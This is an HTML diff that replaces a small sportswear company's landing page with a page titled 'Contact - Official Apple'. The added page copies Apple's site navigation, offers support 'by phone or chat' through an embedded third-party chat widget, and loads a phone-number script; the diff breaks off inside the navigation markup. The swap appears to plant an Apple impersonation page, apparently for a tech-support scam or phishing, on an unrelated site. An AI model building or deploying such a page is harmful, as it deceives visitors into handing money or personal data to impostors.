@@ -1,1464 +1,379 @@
-
-
-<!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width" />
-    <meta name="robots" content="index, follow">
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <title>Foxureulfa | Crafting Modern Apparel for Dedicated Athletes</title>
-    <meta property="og:title" content="Foxureulfa | Crafting Modern Apparel for Dedicated Athletes" />
-    <meta property="og:image" content="product-images/main-sportswear-display.webp" />
-    
-    <link rel="stylesheet" href="files/css/bootstrap.css" />
-    <link rel="stylesheet" href="files/css/bootstrap-icons.css" />
-    <link rel="stylesheet" href="files/css/btn.css" />
-    
-     
-    <link rel="shortcut icon" href="logo2.png" type="image/x-icon" />
-    <link href="https://fonts.googleapis.com/css2?family=Abel&display=swap" rel="stylesheet" />
-    <link href="https://fonts.googleapis.com/css2?family=Viaoda+Libre&display=swap" rel="stylesheet" />
-
-
-    <style>
-
-           body{
-             direction: ltr;
-             font-family: 'Abel', sans-serif !important;
-             font-size: 15px;
-             margin: 0;
-             padding: 0;
-           }
-
-           h1, h2, h3, h4, h5{
-             margin: 0;
-             padding: 0;
-           }
-
-           button{
-             cursor: pointer;
-           }
-
-           button span{
-             font-size:  inherit;
-             line-height: 1.3;
-           }
-           .button-1 {
-              align-items: center;
-              background-color: #FFFFFF;
-              border: 1px solid rgba(0, 0, 0, 0.1);
-              border-radius: .25rem;
-              box-shadow: rgba(0, 0, 0, 0.02) 0 1px 3px 0;
-              box-sizing: border-box;
-              color: rgba(0, 0, 0, 0.85);
-              cursor: pointer;
-              display: inline-flex;
-              font-family: system-ui,-apple-system,system-ui,"Helvetica Neue",Helvetica,Arial,sans-serif;
-              font-size: 16px;
-              font-weight: 600;
-              justify-content: center;
-              line-height: 1.3;
-              margin: 0;
-              min-height: 3rem;
-              padding: calc(.875rem - 1px) calc(1.5rem - 1px);
-              position: relative;
-              text-decoration: none;
-              transition: all 250ms;
-              user-select: none;
-              -webkit-user-select: none;
-              touch-action: manipulation;
-              vertical-align: baseline;
-              width: auto;
-          }
-
-          .button-1:hover,
-          .button-1:focus {
-              border-color: rgba(0, 0, 0, 0.15);
-              box-shadow: rgba(0, 0, 0, 0.1) 0 4px 12px;
-              color: rgba(0, 0, 0, 0.65);
-          }
-
-          .button-1:hover {
-              transform: translateY(-1px);
-          }
-
-          .button-1:active {
-              background-color: #F0F0F1;
-              border-color: rgba(0, 0, 0, 0.15);
-              box-shadow: rgba(0, 0, 0, 0.06) 0 2px 4px;
-              color: rgba(0, 0, 0, 0.65);
-              transform: translateY(0);
-          }
-
-          .button-2 {
-              background: #FF4742;
-              border: 1px solid #FF4742;
-              border-radius: 6px;
-              box-shadow: rgba(0, 0, 0, 0.1) 1px 2px 4px;
-              box-sizing: border-box;
-              color: #FFFFFF;
-              cursor: pointer;
-              display: inline-block;
-              font-family: nunito,roboto,proxima-nova,"proximasans-serif;
-              font-size: 16px;
-              font-weight: 800;
-              line-height: 1.3;
-              min-height: 40px;
-              outline: 0;
-              padding: 12px 14px;
-              text-align: center;
-              text-rendering: geometricprecision;
-              text-transform: none;
-              user-select: none;
-              -webkit-user-select: none;
-              touch-action: manipulation;
-              vertical-align: middle;
-          }
-
-          .button-2:hover,
-          .button-2:active {
-              background-color: initial;
-              background-position: 0 0;
-              color: #FF4742;
-          }
-
-          .button-2:active {
-              opacity: .5;
-          }
-
-          .button-3 {
-              background-color: #c2fbd7;
-              border-radius: 100px;
-              box-shadow: rgba(44, 187, 99, .2) 0 -25px 18px -14px inset,rgba(44, 187, 99, .15) 0 1px 2px,rgba(44, 187, 99, .15) 0 2px 4px,rgba(44, 187, 99, .15) 0 4px 8px,rgba(44, 187, 99, .15) 0 8px 16px,rgba(44, 187, 99, .15) 0 16px 32px;
-              color: green;
-              cursor: pointer;
-              display: inline-block;
-              font-family: CerebriSans-Regular,-apple-ssystem-ui,Roboto,sans-serif;
-              padding: 14px;
-              text-align: center;
-              text-decoration: none;
-              transition: all 250ms;
-              border: 0;
-              font-size: 16px;
-              user-select: none;
-              -webkit-user-select: none;
-              touch-action: manipulation;
-          }
-
-          .button-3:hover {
-              box-shadow: rgba(44,187,99,.35) 0 -25px 18px -14px inset,rgba(44,187,99,.25) 0 1px 2px,rgba(44,187,99,.25) 0 2px 4px,rgba(44,187,99,.25) 0 4px 8px,rgba(44,187,99,.25) 0 8px 16px,rgba(44,187,99,.25) 0 16px 32px;
-              transform: scale(1.05) rotate(-1deg);
-          }
-
-            .button-4 {
-            align-items: center;
-            background-image: linear-gradient(144deg,#AF40FF, #5B42F3 50%,#00DDEB);
-            border: 0;
-            border-radius: 8px;
-            box-shadow: rgba(151, 65, 252, 0.2) 0 15px 30px -5px;
-            box-sizing: border-box;
-            color: #FFFFFF;
-            display: flex;
-            font-family: Phantomsans, sans-serif;
-            font-size: 20px;
-            justify-content: center;
-            line-height: 1.3;
-            max-width: 100%;
-            min-width: 140px;
-            padding: 14px;
-            text-decoration: none;
-            user-select: none;
-            -webkit-user-select: none;
-            touch-action: manipulation;
-            cursor: pointer;
-            }
-
-            .button-4:active,
-            .button-4:hover {
-            outline: 0;
-            }
-
-            .button-4 span {
-            background-color: rgb(5, 6, 45);
-            padding: 16px 24px;
-            border-radius: 6px;
-            width: 100%;
-            height: 100%;
-            transition: 300ms;
-            }
-
-            .button-4:hover span {
-            background: none;
-            }
-
-            @media (min-width: 768px) {
-            .button-4 {
-                font-size: 24px;
-                min-width: 196px;
-            }
-            }
-
-          .button-5 {
-              align-self: center;
-              background-color: #fff;
-              background-image: none;
-              background-position: 0 90%;
-              background-repeat: repeat no-repeat;
-              background-size: 4px 3px;
-              border-radius: 15px 225px 255px 15px 15px 255px 225px 15px;
-              border-style: solid;
-              border-width: 2px;
-              box-shadow: rgba(0, 0, 0, .2) 15px 28px 25px -18px;
-              box-sizing: border-box;
-              color: #41403e;
-              cursor: pointer;
-              display: inline-block;
-              font-family: Neucha, sans-serif;
-              font-size: 1rem;
-              line-height: 23px;
-              outline: none;
-              padding: .75rem;
-              text-decoration: none;
-              transition: all 235ms ease-in-out;
-              border-bottom-left-radius: 15px 255px;
-              border-bottom-right-radius: 225px 15px;
-              border-top-left-radius: 255px 15px;
-              border-top-right-radius: 15px 225px;
-              user-select: none;
-              -webkit-user-select: none;
-              touch-action: manipulation;
-          }
-
-
-          .button-5:hover {
-              box-shadow: rgba(0, 0, 0, .3) 2px 8px 8px -5px;
-              transform: translate3d(0, 2px, 0);
-          }
-
-          .button-5:focus {
-              box-shadow: rgba(0, 0, 0, .3) 2px 8px 4px -6px;
-          }
-           p{
-             font-size:  inherit;
-             margin-bottom: 18px;
-           }
-
-           a{
-             text-decoration: none;
-             font-size:  inherit;
-           }
-
-           img{
-             display: block;
-             max-width: 100%;
-           }
-
-           li{
-             list-style: none;
-           }
-
-           ul{
-             padding: 0;
-             margin: 0;
-           }
-
-           .priv-bloks {
-              word-break: break-all;
-            }
-            .priv-bloks p {
-              padding: 14px 0;
-            }
-            .priv-bloks li {
-              list-style: circle;
-              margin: 0 14px;
-              padding: 14px 0;
-            }
-           
-           
-         
-           .section{
-             padding-top: 79px;
-             padding-bottom:  79px;
-           }
-
-           .title{
-             text-align: center;
-             font-size:  25px;
-             font-weight: 600;
-             line-height: 1.3;
-             margin-bottom: 19px;
-           }
-
-           .subtitle{
-             font-size: 22px;
-             font-weight: 600;
-             line-height: 1.3;
-             margin-bottom:  14px;
-             text-align: start;
-           }
-
-           .text{
-             font-size:  17px;
-             font-weight: 600;
-             text-align: center;
-             line-height: 1.3;
-             margin-bottom: 18px;
-           }
-
-
-           .navbar{
-             filter: contrast(0.8) opacity(0.97) saturate(0.4);;
-             background-color: #3B0944;
-           }
-
-           .navbar-toggler {
-               margin-left: auto;
-               border: none;
-
-           }
-
-           .navbar-toggler:focus,
-           .navbar-toggler:hover,
-           .navbar-toggler:active{
-              box-shadow: none;
-           }
-
-           .navbar-toggler svg{
-            transition: fill 300ms cubic-bezier(0.075, 0.82, 0.165, 1);
-           }
-
-           .navbar-toggler svg:focus,
-           .navbar-toggler svg:hover,
-           .navbar-toggler svg:active{
-             outline: none;
-             fill:  #c3c723;
-           }
-
-           .nav-bg{
-            filter: contrast(0.8) opacity(0.97) saturate(0.4) !important;
-           }
-
-           .nav-link {
-             color: #fefdf8;
-             text-transform: capitalize;
-             padding-left: 14px;
-             padding-right: 14px;
-             transition: color 300ms cubic-bezier(0.075, 0.82, 0.165, 1);
-           }
-
-           .nav-link:hover,
-           .nav-link:focus{
-             color: #c3c723;
-           }
-
-           .logo{
-             display: flex;
-             gap: 14px;
-             align-items: center;
-             justify-content: center;
-             margin-bottom: 30px;
-             margin-top: 30px;
-           }
-
-           .logo img{
-              max-width:  40px;
-           }
-
-           .logo h2{
-             margin: 0;
-             font-size:  25px;
-             color: #fefdf8;
-           }
-           .pad-main {
-            padding: 84px 0px;
-           }
-           .hero{
-             margin-top: -100px;
-             background-color: #3B0944;
-             position: relative;
-             padding-top: Calc(150px + 79px);
-             padding-bottom: 79px;
-             color: #fefdf8;
-             filter: saturate(0.4);
-           }
-
-           .hero-box{
-             display: flex;
-             flex-direction: column;
-             gap: 30px;
-           }
-
-           .hero-title-box{
-             text-align: start;
-           }
-
-           .hero-title{
-               font-size:  25px;
-               font-weight: 600;
-               line-height: 1.3;
-               margin-bottom: 18px;
-               text-align: center;
-           }
-
-           .hero-box-img{
-             display: inline-block;
-             overflow: hidden;
-           }
-
-           .hero-box-img img {
-             transition: 1s;
-             display: block;
-           }
-           .hero-box-img img:hover {
-             transform: scale(1.2);
-           }
-
-           .btn-box{
-             display: inline-block;
-           }
-
-           .services{
-             background-color: #fefdf8;
-           }
-
-           .services-box{
-             display: flex;
-             gap: 24px;
-             flex-direction: column;
-           }
-
-           .services-box-title p{
-             margin-bottom: 47px;
-           }
-
-           .services-box-title h2{
-             color:  #c3c723;
-           }
-
-           .services-list{
-             display: flex;
-             flex-direction: column;
-             gap: 18px;
-           }
-           .services-item:first-child{
-             border-bottom: 1px dashed grey;
-             border-top: 1px dashed grey;
-           }
-           .services-item:last-child{
-             border-bottom: 1px dashed grey;
-             border-top: 1px dashed grey;
-           }
-
-           .services-item{
-             padding-top: 6px;
-             padding-bottom: 6px;
-           }
-
-           .services-item p{
-             text-align: start;
-             padding: 0;
-           }
-
-          .main-wrapper{
-             display: flex;
-             justify-content: center;
-             align-items: center;
-
-             width: 100%;
-             background: radial-gradient(#c3c723 5%, transparent 20%) 0 0, radial-gradient(rgba(0,0,0,.1) 1%, transparent 1%) 50px 50px;
-             background-size: 15px 15px;
-           }
-           .main-img {
-            height: 529px;
-            object-fit: contain;
-            width: 100%;
-           }
-           .main-description p{
-             font-size:  17px;
-             line-height: 1.3;
-             margin-bottom: 18px:
-           }
-
-           .price{
-             font-size:  25px;
-             color: #c3c723;
-           }
-
-            .solution{
-              background-color: #3B0944;
-              color: #fefdf8;
-              filter: saturate(0.7);
-            }
-
-            .solution-list{
-              display: flex;
-              flex-direction: column;
-              gap: 30px;
-            }
-
-            .solution-item h3{
-              margin: 18px;
-            }
-
-            .wr-glr{
-              position: relative;
-              padding: 14px;
-            }
-
-            .solution-img-box{
-              position: relative;
-              bottom: 10px;
-              left: -10px;
-              z-index: 999;
-              display: inline-block;
-              overflow: hidden;
-            }
-
-            .solution-img-box img{
-              transition: 1s;
-              display: block;
-              border-radius: 3px;
-              object-fit: cover;
-            }
-
-           .solution-img-box img:hover {
-             transform: scale(1.2);
-           }
-
-            .bg-box{
-              background-color: #c3c723;
-              position: relative;
-              bottom: 10px;
-              left: 0;
-              border-radius: 3px;
-            }
-
-            .fl-box{
-              display: flex;
-              flex-wrap: wrap;
-              flex-direction: column;
-            }
-
-            .questions{
-              background-color: #fff;
-            }
-
-            .questions-list{
-              display: flex;
-              flex-direction: column;
-              gap: 18px;
-            }
-
-            .questions-items{
-              box-shadow: 0 7px 30px -10px rgba(150,170,180,0.5);
-              padding: 18px;
-              display: flex;
-              flex-direction: column;
-              align-items: center;
-              text-align: start;
-            }
-
-            .questions-items img{
-              width: 80px;
-              height: 80px;
-              margin-bottom: 18px;
-              margin-top: 18px;
-            }
-
-
-
-          .contact-form{
-              margin: 0 auto;
-              text-align: start;
-              padding: 24px;
-            }
-
-            .contact-wrapper{
-              display: flex;
-              flex-direction: column;
-              margin-bottom: 6px;
-            }
-            .input-field-box--item{
-              margin-top: 10px;
-              display: block;
-              width: 100%;
-              padding:  14px;
-              font-size: 1rem;
-              font-weight: 400;
-              line-height:1.3;
-              color: #212529;
-              background-color: #fff;
-              background-clip: padding-box;
-              border: 1px solid #ced4da;
-              -webkit-appearance: none;
-              -moz-appearance: none;
-              appearance: none;
-              border-radius: 0.25rem;
-              transition: border-color .15s ease-in-out,box-shadow .15s ease-in-out;
-          }
-          .textarea-field-box--item{
-            margin-top: 10px;
-              width: 100%;
-              border: 1px solid #ced4da;
-              border-radius: 0.25rem;
-              padding:  14px;
-          }
-            .contact-input{
-              padding:  14px;
-            }
-
-            .contact-text{
-              margin: 0;
-              text-align: start;
-            }
-
-            .contact-btn{
-              margin-top:  18px;
-              margin-bottom: 18px;
-            }
-
-            .form-box-reviews{
-              background: radial-gradient(#c3c723 5%, transparent 20%) 0 0, radial-gradient(rgba(0,0,0,.1) 1%, transparent 1%) 50px 50px;
-              background-size: 15px 15px;
-              padding: 30px 15px;
-           }
-
-           .review-img{
-            margin-right: 30px;
-           }
-
-           .review-box{
-            background-color: #fff;
-            padding: 15px;
-            position: relative;
-            margin-left: 30px;
-            margin-top: -30px;
-            box-shadow: 0px 50px 100px -20px rgba(50, 50, 93, 0.15), 0px 30px 60px -30px rgba(0, 0, 0, 0.2), inset 0px -2px 6px 0px rgba(10, 37, 64, 0.25);
-            text-align: start;
-           }
-
-           .raiting{
-             display: flex;
-             gap: 6px;
-             margin-bottom: 15px;
-            }
-
-            .raiting div{
-              color: #c3c723;
-           }
-
-           .gallery-list{
-            display: grid;
-            grid-template-columns: repeat(6, 1fr);
-            grid-gap: 14px;
-           }
-
-           .gallery-list li{
-              display: flex;
-              justify-content: center;
-              align-items: center;
-           }
-
-           .gallery-item{
-              display: inline-block;
-              overflow: hidden;
-            }
-
-            .gallery-item img{
-              transition: 1s;
-              display: block;
-              border-radius: 3px;
-              object-fit: cover;
-              filter: saturate(0.4);
-            }
-
-           .gallery-item img:hover {
-             transform: scale(1.2);
-           }
-
-
-           .gallery-item-one{
-            grid-column-start: 1;
-            grid-column-end: 6;
-           }
-
-           .gallery-item-second{
-              grid-column-start: 1;
-              grid-column-end: 3;
-           }
-
-            .gallery-item-third{
-              grid-column-start: 3;
-              grid-column-end: 7;
-           }
-
-           .gallery-item-four {
-              grid-column-start: 1;
-              grid-column-end: 7;
-           }
-
-            .gallery-item-five {
-              grid-column-start: 2;
-              grid-column-end: 6;
-           }
-
-           .gallery-item-six {
-              grid-column-start: 1;
-              grid-column-end: 3;
-           }
-
-           .gallery-item-seven {
-              grid-column-start: 3;
-              grid-column-end: 7;
-           }
-
-           .gallery-item-eight {
-              grid-column-start: 2;
-              grid-column-end: 6;
-           }
-
-           .form-check .form-check-input {
-              float: inherit;
-           }
-
-          .footer{
-            padding-bottom: 0;
-          }
-
-           .footer-logo{
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-            margin-bottom: 24px;
-           }
-
-           .footer-logo img{
-            width: 50px;
-            margin-right:  6px;
-           }
-
-           .footer-map{
-            margin-bottom: 20px;
-           }
-
-           .footer-map iframe{
-            height: 350px;
-           }
-
-            .footer-contacts{
-                padding: 30px;
-             }
-
-              .footer-list{
-                list-style: none;
-                margin: 0;
-                padding: 0;
-                text-align: start;
-              }
-
-              .footer-item{
-                margin-bottom: 30px;
-              }
-
-              .footer-item a{
-                text-decoration: none;
-                color: inherit;
-              }
-
-              .footer:last-child{
-                margin-bottom: 0;
-              } 0 0 0;
-                word-break: break-word;
-                line-height: 1.5;
-                opacity: 0.85;
-              }
-
-              .footer-called{
-                color: #c3c723;
-                margin-bottom: 2px;
-              }
-
-              .footer-privacy-wrapper{
-                padding-top: 20px;
-                padding-bottom: 20px;
-                box-shadow: 0px 50px 100px -20px rgba(50, 50, 93, 0.15), 0px 30px 60px -30px rgba(0, 0, 0, 0.2), inset 0px -2px 6px 0px rgba(10, 37, 64, 0.25);
-                margin-top: 18px;
-              }
-
-              .footer-privacy{
-                color: #828080;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                text-decoration: none;
-                margin-bottom: 30px;
-
-                transition: color 300ms cubic-bezier(0.075, 0.82, 0.165, 1);
-              }
-
-              .footer-privacy:hover,
-              .footer-privacy:focus{
-                color: #c3c723;
-              }
-
-
-
-        
-          @media (max-width: 767px){
-            .main-img {
-              height: auto;
-            }
-            .bg-box{
-              min-width: 270px;
-            }
-
-           .contact-form{
-              margin-bottom: 6px;
-            }
-          }
-
-           @media (min-width: 768px){
-           .section{
-             padding-top: 84px;
-             padding-bottom: 84px;
-           }
-
-           .title{
-             font-size: 25px;
-             margin-bottom: 24px;
-           }
-
-           .subtitle{
-             font-size: 25px;
-             line-height: 1.33;
-             margin-bottom: 22px;
-           }
-
-           .logo img{
-              max-width: 88;
-           }
-
-           .logo h2{
-             font-size: 47px;
-           }
-
-           .hero{
-             padding-top: Calc(150px + 79px);
-             padding-bottom: 79px;
-           }
-
-            .hero-box{
-             display: flex;
-             flex-direction: row-reverse;
-             gap: 30px;
-           }
-
-           .hero-title-box{
-             text-align: start;
-             flex: 1;
-             min-height: 250px;
-           }
-
-           .hero-box-wr{
-             flex: 1.5;
-             position: relative;
-           }
-           .hero-box-img{
-             height: 400px;
-             display: inline-block;
-             overflow: hidden;
-             position: absolute;
-             top: 0;
-             left: 0;
-             right: 0;
-           }
-           .services-box{
-             margin-top: 30px;
-           }
-
-           .services-box-title{
-             flex: 1;
-           }
-
-           .services-box-list{
-             flex: 1;
-           }
-
-           .services-box-title p{
-             font-size: 20px;
-           }
-
-            .solution-list{
-              flex-direction: row;
-            }
-
-            .solution-item{
-              flex: 1;
-            }
-
-            .solution-item:nth-child(even){
-              margin-top: 70px;
-            }
-
-            .solution-item h3{
-              font-weight: 400;
-              font-size: 20px;
-            }
-
-            .solution-img-box img{
-                min-height: 160px;
-            }
-
-            .questions-list{
-              flex-direction: column-reverse;
-            }
-
-
-            .questions-items{
-              flex: 1;
-              padding: 24px;
-              min-height: 360px;
-            }
-
-              .contact-form{
-                padding: 34px;
-              }
-
-              .contact-wrapper{
-                margin-bottom: 6px;
-              }
-
-              .contact-text{
-                text-align: end;
-                margin-right: 15px;
-              }
-
-          .gallery-item{
-            height: 230px;
-          }
-
-          .gallery-item img{
-            height: 100%;
-            width: 100%;
-          }
-
-          .gallery-item-one{
-            grid-column-start: 1;
-            grid-column-end: 4;
-           }
-
-           .gallery-item-second{
-              grid-column-start: 4;
-              grid-column-end: 7;
-           }
-
-            .gallery-item-third{
-              grid-column-start: 1;
-              grid-column-end: 7;
-           }
-
-           .gallery-item-four {
-              grid-column-start: 1;
-              grid-column-end: 4;
-           }
-
-            .gallery-item-five {
-              grid-column-start: 4;
-              grid-column-end: 7;
-           }
-
-           .gallery-item-six {
-              grid-column-start: 1;
-              grid-column-end: 7;
-           }
-
-           .gallery-item-seven {
-              grid-column-start: 1;
-              grid-column-end: 4;
-           }
-
-           .gallery-item-eight {
-              grid-column-start: 4;
-              grid-column-end: 7;
-           }
-
-           .footer{
-            padding-bottom: 0;
-           }
-
-           .footer-privacy{
-            margin-bottom: 0;
-           }
-
-           .footer-privacy-wrapper{
-                display: flex;
-                justify-content: space-around;
-                gap:  18px;
-              }
-
-              .footer-box{
-                display: flex;
-                flex-direction: row-reverse;
-              }
-
-              .footer-logo{
-                flex: 1;
-              }
-
-              .footer-map{
-                flex: 1;
-              }
-           }
-
-           @media(min-width: 992px){
-            .navbar{
-             filter: saturate(0.4);
-           }
-           .hero-box-img{
-             bottom: -120px;
-           }
-
-           .content-box{
-             display: flex;
-             gap: 47px;
-             flex-direction: column-reverse;
-           }
-
-           .content-box > div{
-             flex: 1;
-           }
-
-            .solution-img-box img{
-                min-height: 260px;
-            }
-
-           .form-box{
-              display: flex;
-              justify-content: center;
-              gap: 6px;
-              flex-direction: row-reverse;
-            }
-
-            .form-box-reviews{
-              flex: 1;
-              width: 50%;
-              margin: 0 auto;
-            }
-
-
-            .contact-form{
-              flex: 1;
-            }
-
-            .review-box{
-              display: flex;
-              flex-direction:  column;
-            }
-           }
-
-           @media(max-width: 991px){
-           .content-box{
-             flex-direction: column !important;
-           }
-           }
-
-           @media(min-width: 1024px){
-            .solution-item h3{
-              font-size: 18px;
-            }
-           .hero{
-             padding-top: Calc(50px + 124px);
-             padding-bottom: Calc(200px - 124px);
-           }
-           .title{
-             font-size:  37px;
-             line-height: 1.33;
-             margin-bottom: 30px;
-           }
-
-           .logo{
-             margin-bottom: 47px;
-           }
-
-            .solution-img-box img{
-                min-height: 270px;
-            }
-
-            .gallery-item-one{
-            grid-column-start: 1;
-            grid-column-end: 3;
-           }
-
-           .gallery-item-second{
-              grid-column-start: 3;
-              grid-column-end: 5;
-           }
-
-            .gallery-item-third{
-              grid-column-start: 5;
-              grid-column-end: 7;
-           }
-
-           .gallery-item-four {
-              grid-column-start: 1;
-              grid-column-end: 4;
-           }
-
-            .gallery-item-five {
-              grid-column-start: 4;
-              grid-column-end: 7;
-           }
-
-           .gallery-item-six {
-              grid-column-start: 1;
-              grid-column-end: 3;
-           }
-
-           .gallery-item-seven {
-              grid-column-start: 3;
-              grid-column-end: 5;
-           }
-
-           .gallery-item-eight {
-              grid-column-start: 5;
-              grid-column-end: 7;
-           }
-
-           }
-
-           @media(min-width: 1400px){
-            .solution-img-box img{
-              min-height: 316px;
-            }
-
-            .contact-wrapper{
-                grid-template-columns: 0.6fr 1.4fr;
-              }
-           }
-    
-.company-id{display:inline-block;margin-top:.7em;font-size:.82em;opacity:.72;letter-spacing:.04em;line-height:1.5;text-decoration:none;cursor:default;pointer-events:none;flex-shrink:0;max-width:100%;}.company-id-wrap{flex-shrink:0;max-width:100%;}
-</style>
-    
-  </head>
-  <body>
-
-    
-    <div class="header fixed-top">
-      <nav class="navbar navbar-expand-lg">
-        <div class="container-fluid container">
-          <button
-            class="navbar-toggler"
-            type="button"
-            data-bs-toggle="collapse"
-            data-bs-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent"
-            aria-expanded="false"
-            aria-label="Toggle navigation"
-          >
-            <svg
-              xmlns="http://www.w3.org/2000/svg"
-              width="30"
-              height="30"
-              fill="#fefdf8"
-              class="bi bi-justify"
-              viewBox="0 0 16 16"
-            >
-              <path
-                fill-rule="evenodd"
-                d="M2 12.5a.5.5 0 0 1 .5-.5h11a.5.5 0 0 1 0 1h-11a.5.5 0 0 1-.5-.5zm0-3a.5.5 0 0 1 .5-.5h11a.5.5 0 0 1 0 1h-11a.5.5 0 0 1-.5-.5zm0-3a.5.5 0 0 1 .5-.5h11a.5.5 0 0 1 0 1h-11a.5.5 0 0 1-.5-.5zm0-3a.5.5 0 0 1 .5-.5h11a.5.5 0 0 1 0 1h-11a.5.5 0 0 1-.5-.5z"
-              />
-            </svg>
-          </button>
-          <div
-            class="collapse navbar-collapse text-center"
-            id="navbarSupportedContent"
-          >
-            <ul class="navbar-nav me-auto ms-auto mb-2 mb-lg-0">
-              <li>
-                <a class="nav-link" href="./#home">Home</a>
-              </li>
-              <li>
-                <a class="nav-link" href="./#about-us">About us</a>
-              </li>
-              <li>
-                <a class="nav-link" href="./#services">Our Services</a>
-              </li>
-              
-              
-              
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js"><head>
+
+<!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-zcCRHMoxwMoLKd8t6PY02.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script async="" src="https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t" charset="UTF-8" crossorigin="*"></script><script src="js/text_tel.js"></script>
+
+</head>
+
+<body>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
             </ul>
-          </div>
-        </div>
-      </nav>
-    </div>
-    <div class="hero" id="home">
-      <div class="container">
-        <div class="logo">
-          <img src="logo2.png" alt="" />
-          <h2>Foxureulfa</h2>
-        </div>
-        <div class="hero-box">
-          <div class="hero-title-box">
-            <h3 class="hero-title">Engineered Sportswear for Peak Athletic Performance</h3>
-
-            
-          </div>
-          <div class="hero-box-wr">
-            <div class="hero-box-img">
-              <img class="hero-img" src="assets/images/running-gear-display.webp" alt="" />
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    
-    <div class="section services" id="services">
-      <div class="container">
-        <div class="services-box">
-          <div class="services-box-title">
-            <h2 class="title fw-bold">Our Services</h2>
-            <p class="text">Our Professional Services</p>
-          </div>
-          <div class="services-box-list">
-            <ul class="services-list">
-              <li class="services-item">
-                <h3 class="subtitle">✦</h3>
-                <p class="text fw-normal">Custom team uniform manufacturing with personalized branding and high-definition sublimation printing.</p>
-              </li>
-              <li class="services-item">
-                <h3 class="subtitle">✦</h3>
-                <p class="text fw-normal">Bulk equipment supply and specialized athletic apparel provisioning for local clubs and training academies.</p>
-              </li>
-              <li class="services-item">
-                <h3 class="subtitle">✦</h3>
-                <p class="text fw-normal">Tailored fitting sessions and professional consultations for endurance athletes seeking optimal gear.</p>
-              </li>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
